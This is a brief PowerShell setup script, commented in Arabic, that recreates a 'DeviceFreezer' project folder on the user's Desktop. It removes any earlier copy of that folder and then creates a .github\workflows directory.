# إنشاء مجلد المشروع على سطح المكتب
$desktop = [Environment]::GetFolderPath("Desktop")
$projectDir = "$desktop\DeviceFreezer"
Remove-Item -Path $projectDir -Recurse -Force -ErrorAction SilentlyContinue

# إنشاء هيكل المجلدات
New-Item -ItemType Directory -Path "$projectDir\.github\workflows" -Force | Out-Null
